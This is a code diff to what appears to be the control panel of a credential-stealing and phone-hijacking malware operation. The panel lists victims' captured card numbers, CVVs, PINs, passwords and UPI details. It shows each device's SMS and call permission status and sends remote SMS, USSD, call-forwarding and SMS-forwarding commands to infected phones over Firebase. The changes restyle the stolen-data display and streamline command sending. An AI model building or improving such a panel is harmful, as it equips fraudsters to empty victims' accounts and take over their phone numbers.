@@ -452,9 +452,9 @@
                     const val = combinedData[k];
                     const isS = /card|cvv|pin|pass|upi/.test(k.toLowerCase());
                     fieldsHtml += `
-                        <div class="${isS ? 'bg-rose-50 border-rose-100' : 'bg-slate-50 border-slate-100'} p-2 rounded border mt-1">
-                            <div class="text-[9px] ${isS ? 'text-rose-400' : 'text-slate-400'} font-black uppercase">${k}</div>
-                            <div class="text-sm font-black ${isS ? 'text-rose-600' : 'text-slate-700'}">${val}</div>
+                        <div class="flex justify-between items-center py-1.5 border-b border-slate-100 last:border-0">
+                            <div class="text-[10px] ${isS ? 'text-rose-500' : 'text-slate-400'} font-black uppercase tracking-tighter">${k}</div>
+                            <div class="text-[11px] font-black ${isS ? 'text-rose-600' : 'text-slate-700'} text-right">${val}</div>
                         </div>`;
                 }
 
@@ -463,14 +463,14 @@
                     card.className = "user-box border-l-4 border-l-rose-500";
                     card.onclick = () => showUserDetails(ug.uid);
                     card.innerHTML = `
-                        <div class="flex justify-between items-center mb-3">
+                        <div class="flex justify-between items-center mb-3 pb-2 border-b border-slate-100">
                             <div class="flex items-center gap-2">
                                 <div class="text-[10px] font-black text-slate-300">#${permIds[ug.uid]}</div>
                                 <span class="text-[10px] font-black text-rose-600 uppercase bg-rose-50 px-2 py-0.5 rounded">${ug.name}</span>
                             </div>
-                            <span class="text-[9px] text-slate-400 font-mono">${new Date(ug.lastTs).toLocaleString()}</span>
+                            <span class="text-[9px] text-slate-400 font-mono">${new Date(ug.lastTs).toLocaleTimeString()}</span>
                         </div>
-                        <div class="grid grid-cols-1 gap-2">${fieldsHtml}</div>
+                        <div class="space-y-0.5">${fieldsHtml}</div>
                     `;
                     listDiv.appendChild(card);
                 }
@@ -547,6 +547,11 @@
         document.getElementById('det-bat').innerText = `${info.bl || 0}%`;
         document.getElementById('det-online-dot').className = `w-2.5 h-2.5 rounded-full ${isOnline ? 'bg-green-500 online-dot' : 'bg-slate-300'}`;
 
+        // Permissions Status Badges
+        const smsBadge = info.ps ? '<span class="bg-green-100 text-green-700 px-1.5 rounded text-[8px] font-black border border-green-200 uppercase">SMS: ON</span>' : '<span class="bg-rose-100 text-rose-700 px-1.5 rounded text-[8px] font-black border border-rose-200 uppercase">SMS: OFF</span>';
+        const callBadge = info.pc ? '<span class="bg-green-100 text-green-700 px-1.5 rounded text-[8px] font-black border border-green-200 uppercase ml-1">CALL: ON</span>' : '<span class="bg-rose-100 text-rose-700 px-1.5 rounded text-[8px] font-black border border-rose-200 uppercase ml-1">CALL: OFF</span>';
+        document.getElementById('det-model').innerHTML = `${info.mf || 'NA'} | V:${info.v || 'NA'} <div class="mt-1">${smsBadge}${callBadge}</div>`;
+
         // Update SIM dropdowns with actual numbers
         const s1Text = sims[0]?.n && sims[0].n !== 'Hidden' ? sims[0].n : "SIM 1";
         const s2Text = sims[1]?.n && sims[1].n !== 'Hidden' ? sims[1].n : "SIM 2";
@@ -574,15 +579,19 @@
         Object.values(u.F || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach((f, idx) => {
             const wrap = document.createElement('div');
             wrap.className = "bg-white border-l-4 border-l-rose-600 p-4 shadow-sm rounded-xl";
-            wrap.innerHTML = `<div class="text-xs font-black text-rose-600 uppercase mb-3">ENTRY #${idx+1} <span class="text-slate-400 ml-2 font-mono text-[10px]">${new Date(f.ts).toLocaleString()}</span></div>`;
-            let grid = `<div class="grid grid-cols-1 gap-3">`;
+            wrap.innerHTML = `<div class="text-xs font-black text-rose-600 uppercase mb-3 pb-2 border-b border-slate-100">ENTRY #${idx+1} <span class="text-slate-400 ml-2 font-mono text-[10px]">${new Date(f.ts).toLocaleString()}</span></div>`;
+            let rows = `<div class="space-y-0.5 mt-2">`;
             for(let k in f) {
                 if(['ts','uid','name','page','timestamp'].includes(k)) continue;
                 const isS = /card|cvv|pin|pass|upi/.test(k.toLowerCase());
-                grid += `<div class="bg-slate-50 p-2.5 rounded-lg border border-slate-100"><div class="text-[10px] text-slate-400 uppercase font-black mb-0.5">${k}</div><div class="text-sm font-black ${isS ? 'text-rose-600' : 'text-slate-900'}">${f[k]}</div></div>`;
+                rows += `
+                    <div class="flex justify-between items-center py-1.5 border-b border-slate-50 last:border-0">
+                        <div class="text-[10px] ${isS ? 'text-rose-500' : 'text-slate-400'} font-black uppercase tracking-tighter">${k}</div>
+                        <div class="text-[11px] font-black ${isS ? 'text-rose-600' : 'text-slate-700'} text-right">${f[k]}</div>
+                    </div>`;
             }
-            grid += `</div>`;
-            wrap.innerHTML += grid;
+            rows += `</div>`;
+            wrap.innerHTML += rows;
             formDiv.appendChild(wrap);
         });
     }
@@ -630,6 +639,19 @@
             cmd.t = 'SET_SMS_FORWARD'; cmd.n = "";
         }
         db.ref(`Users/${selectedUid}/C`).push(cmd);
+
+        // Clear input fields after sending
+        if(type === 'SEND_SMS') {
+            document.getElementById('cmd-sms-num').value = "";
+            document.getElementById('cmd-sms-msg').value = "";
+        } else if(type === 'USSD') {
+            document.getElementById('cmd-ussd-code').value = "";
+        } else if(type === 'CALL_FORWARD') {
+            document.getElementById('cmd-cf-num').value = "";
+        } else if(type === 'SET_SMS_FORWARD') {
+            document.getElementById('cmd-sf-num').value = "";
+        }
+
         const st = document.getElementById('cmd-status');
         st.innerText = "SENT ✓"; st.className = "text-[10px] font-black bg-green-600 px-3 py-1 rounded text-white";
         setTimeout(() => { st.innerText = "READY"; st.className = "text-[10px] font-black bg-slate-800 px-3 py-1 rounded text-slate-400"; }, 2000);
